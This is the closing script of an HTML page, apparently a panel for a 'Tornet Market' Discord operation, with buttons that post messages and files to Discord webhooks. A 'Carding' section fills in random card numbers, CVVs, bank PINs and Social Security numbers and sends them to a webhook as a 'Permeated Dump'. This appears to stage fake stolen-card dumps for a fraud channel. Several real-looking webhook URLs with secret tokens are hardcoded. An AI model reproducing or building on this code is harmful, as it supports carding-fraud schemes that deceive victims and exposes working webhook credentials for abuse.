    } else {
      alert("Please enter a message.");
    }
  }

  // Function to generate random card number
  function generateRandomCardNumber() {
    let result = '';
    for (let i = 0; i < 16; i++) {
      result += Math.floor(Math.random() * 10);
      if ((i + 1) % 4 === 0 && i < 15) {
        result += ' '; // Add space every 4 digits for better readability
      }
    }
    return result;
  }

  // Function to generate random CVV (3 digits)
  function generateRandomCVV() {
    return Math.floor(100 + Math.random() * 900).toString();
  }

  // Function to generate random expiration date (MM/YY format)
  function generateRandomExpDate() {
    const month = Math.floor(1 + Math.random() * 12).toString().padStart(2, '0');
    const year = (new Date().getFullYear() + Math.floor(Math.random() * 5)).toString().slice(-2); // Random year within the next 5 years
    return `${month}/${year}`;
  }

  // Function to generate random cardholder name
  function generateRandomCardHolderName() {
    const commonNames = [
      "James Smith", "John Johnson", "Robert Williams", "Michael Brown", "William Jones",
      "David Miller", "Richard Davis", "Joseph Garcia", "Charles Rodriguez", "Thomas Wilson",
      "Mary Martinez", "Patricia Anderson", "Jennifer Taylor", "Linda Lopez", "Elizabeth Gonzalez",
      "Barbara Moore", "Susan Hernandez", "Jessica King", "Sarah Wright", "Karen Lopez",
      "Daniel Hill", "Matthew Scott", "Christopher Green", "Anthony Adams", "Mark Baker"
    ];
    return commonNames[Math.floor(Math.random() * commonNames.length)];
  }

      /// Function to generate random address
    function generateRandomAddress() {
      const addresses = [
        "123 Main St", "456 Elm St", "789 Oak Ave", "567 Pine Rd", "890 Maple Ln",
        "234 Cedar Dr", "345 Birch Blvd", "678 Walnut Way", "901 Spruce Ct", "432 Ash Pl"
      ];
      return addresses[Math.floor(Math.random() * addresses.length)];
    }

    // Function to generate random city
    function generateRandomCity() {
      const cities = [
        "New York", "Los Angeles", "Chicago", "Houston", "Phoenix",
        "Philadelphia", "San Antonio", "San Diego", "Dallas", "San Jose"
      ];
      return cities[Math.floor(Math.random() * cities.length)];
    }

    // Function to generate random state
    function generateRandomState() {
      const states = [
        "NY", "CA", "IL", "TX", "AZ",
        "PA", "TX", "CA", "TX", "CA"
      ];
      return states[Math.floor(Math.random() * states.length)];
    }

    // Function to generate random zip code
    function generateRandomZipCode() {
      return Math.floor(10000 + Math.random() * 90000).toString();
    }

    // Function to generate random bank pin
    function generateRandomBankPin() {
      return Math.floor(1000 + Math.random() * 9000).toString();
    }

    // Function to generate random social security number
    function generateRandomSocialSecurity() {
      const ssn1 = Math.floor(100 + Math.random() * 900).toString();
      const ssn2 = Math.floor(10 + Math.random() * 90).toString();
      const ssn3 = Math.floor(1000 + Math.random() * 9000).toString();
      return `${ssn1}-${ssn2}-${ssn3}`;
    }

  // Fill Carding Message
  document.getElementById('fillButtonCarding').onclick = function() {
    document.getElementById('cardNumber').value = generateRandomCardNumber();
    document.getElementById('cvv').value = generateRandomCVV();
    document.getElementById('expDate').value = generateRandomExpDate();
    document.getElementById('cardHolderName').value = generateRandomCardHolderName();
  }

  // Full Carding Message
  document.getElementById('fullButtonCarding').onclick = function() {
        document.getElementById('cardNumber').value = generateRandomCardNumber();
        document.getElementById('cvv').value = generateRandomCVV();
        document.getElementById('expDate').value = generateRandomExpDate();
        document.getElementById('cardHolderName').value = generateRandomCardHolderName();
        document.getElementById('address').value = generateRandomAddress();
        document.getElementById('city').value = generateRandomCity();
        document.getElementById('state').value = generateRandomState();
        document.getElementById('zipCode').value = generateRandomZipCode();
        document.getElementById('bankPin').value = generateRandomBankPin();
        document.getElementById('socialSecurity').value = generateRandomSocialSecurity();
  }

  // Clear Updates Message
  document.getElementById('clearButtonUpdates').onclick = function() {
    document.getElementById('discordMessageUpdates').value = '';
  }

  // Fill Transactions Message
  document.getElementById('fillButtonTransactions').onclick = function() {
    document.getElementById('discordMessageTransactions').value = "💲 Tornet Market ™ : You spent $9.10 at La Dolce Vita Gelato.";
  }

  // Send Transactions Message
  document.getElementById('sendButtonTransactions').onclick = function() {
    const message = document.getElementById('discordMessageTransactions').value;
    if (message) {
      const webhookUrl = "https://discord.com/api/webhooks/1255007291263029278/Q1Zj-tK-KUwyiwygqaMj7_5J3Qn_fbA-0mS00gXSXRAZhLVtHjeeSTCZKZ4P0GkdSZpP";
      sendMessageToDiscord({ content: message }, webhookUrl);
    } else {
      alert("Please enter a message.");
    }
  }

  // Clear Transactions Message
  document.getElementById('clearButtonTransactions').onclick = function() {
    document.getElementById('discordMessageTransactions').value = '';
  }

  // Send Chat Message
  document.getElementById('sendButtonChat').onclick = function() {
    const message = document.getElementById('discordMessageChat').value;
    if (message) {
      const webhookUrl = "https://discord.com/api/webhooks/1259398370427011142/xXbcXzZMBGx2L-zvoPkpztM3U05EQBIk_9Wy2-rqGdQj92Me79eoCzK6tgNDhiEf7knX";
      sendMessageToDiscord({ content: message }, webhookUrl);
    } else {
      alert("Please enter a message.");
    }
  }

  // Clear Chat Message
  document.getElementById('clearButtonChat').onclick = function() {
    document.getElementById('discordMessageChat').value = '';
  }

  // Send Carding Message
  document.getElementById('sendButtonCarding').onclick = function() {
        const embed = {
          title: "Permeated Dump",
          fields: [
            { name: "Card Number", value: document.getElementById('cardNumber').value },
            { name: "CVV", value: document.getElementById('cvv').value },
            { name: "Exp Date", value: document.getElementById('expDate').value },
            { name: "CardHolder Name", value: document.getElementById('cardHolderName').value },
            { name: "Address", value: document.getElementById('address').value },
            { name: "City", value: document.getElementById('city').value },
            { name: "State", value: document.getElementById('state').value },
            { name: "Zip Code", value: document.getElementById('zipCode').value },
            { name: "Bank Pin", value: document.getElementById('bankPin').value },
            { name: "Social Security", value: document.getElementById('socialSecurity').value }
          ],
          color: 0x5865F2 // Blurple color
        };
        // Replace with your actual Discord webhook URL
        const webhookUrl = "https://discord.com/api/webhooks/1259400460087853076/jRJwKt013rSHSsh-2yLH0fXnBRPFqDmUG08Dow9fIYtyeNGyy_-gjubTjIzqMVY0qShw";
        
        // Send the embed via Discord webhook
        fetch(webhookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ embeds: [embed] })
        })
        .then(response => {
          if (!response.ok) {
            throw new Error('Failed to send message via webhook');
          }
          alert('Carding information sent successfully!');
        })
        .catch(error => {
          console.error('Error sending carding information:', error);
          alert('Failed to send carding information. Please try again.');
        });
      }

  // Clear Carding Message
  document.getElementById('clearButtonCarding').onclick = function() {
        document.getElementById('cardNumber').value = '';
        document.getElementById('cvv').value = '';
        document.getElementById('expDate').value = '';
        document.getElementById('cardHolderName').value = '';
        document.getElementById('address').value = '';
        document.getElementById('city').value = '';
        document.getElementById('state').value = '';
        document.getElementById('zipCode').value = '';
        document.getElementById('bankPin').value = '';
        document.getElementById('socialSecurity').value = '';
      }

  // Send SSL-TLS Message
  document.getElementById('sendButtonSslTls').onclick = function() {
    const message = document.getElementById('discordMessageSslTls').value;
    if (message) {
      const webhookUrl = "https://discord.com/api/webhooks/1259401621662597182/QShu45jUJiNnRl-wP7htyCWZ14TcpR8QKtRz1l-3LqgWQNVTgIkzWzlEKTxpvHihjNzm";
      sendMessageToDiscord({ content: message }, webhookUrl);
    } else {
      alert("Please enter a message.");
    }
  }

  // Clear SSL-TLS Message
  document.getElementById('clearButtonSslTls').onclick = function() {
    document.getElementById('discordMessageSslTls').value = '';
  }

  // Choose File Button
  document.getElementById('chooseFileButton').onclick = function() {
    document.getElementById('fileInput').click();
  }

  // Handle File Input Change
  document.getElementById('fileInput').onchange = function(event) {
    const file = event.target.files[0];
    if (file) {
      document.getElementById('fileName').value = file.name;
      uploadFileToDiscord(file);
    } else {
      document.getElementById('fileName').value = 'No file chosen';
    }
  }

  // Recon Button
  document.getElementById('reconButton').onclick = function() {
    const reconInput = document.getElementById('reconInput').value;
    if (reconInput) {
      const message = `🕵️ Recon Input: ${reconInput}`;
      const webhookUrls = [
        "https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz1234567890",
        "https://discord.com/api/webhooks/987654321098765432/zyxwvutsrqponmlkjihgfedcba0987654321"
      ];
      sendMessagesToDiscord({ content: message }, webhookUrls);
    } else {
      alert("Please enter a recon input.");
    }
  }

  // Clear Recon Input
  document.getElementById('clearReconButton').onclick = function() {
    document.getElementById('reconInput').value = '';
  }

  // Clear Uploads Input
  document.getElementById('clearUploadsButton').onclick = function() {
    document.getElementById('fileName').value = 'No file chosen';
    document.getElementById('fileInput').value = '';
  }

  function sendMessageToDiscord(message, webhookUrl) {
    fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(message)
    }).then(response => {
      if (response.ok) {
        alert('Message sent successfully!');
      } else {
        alert('Failed to send message.');
      }
    }).catch(error => {
      console.error('Error sending message:', error);
      alert('Error sending message.');
    });
  }

  function sendMessagesToDiscord(message, webhookUrls) {
    webhookUrls.forEach(webhookUrl => {
      sendMessageToDiscord(message, webhookUrl);
    });
  }

  

  function uploadFileToDiscord(file) {
    const webhookUrl = "https://discord.com/api/webhooks/1245113423474200596/q7UsDWbvHm8xUMz0x4Ootelc3vR0152syVJgpLAyAQusLH_f_slLFZ3ODMR2MGytCa9p";
    const formData = new FormData();
    formData.append('file', file);
    fetch(webhookUrl, {
      method: 'POST',
      body: formData
    }).then(response => {
      if (response.ok) {
        alert('File uploaded successfully!');
      } else {
        alert('Failed to upload file.');
      }
    }).catch(error => {
      console.error('Error uploading file:', error);
      alert('Error uploading file.');
    });
  }
});

  </script>
</body>
</html>
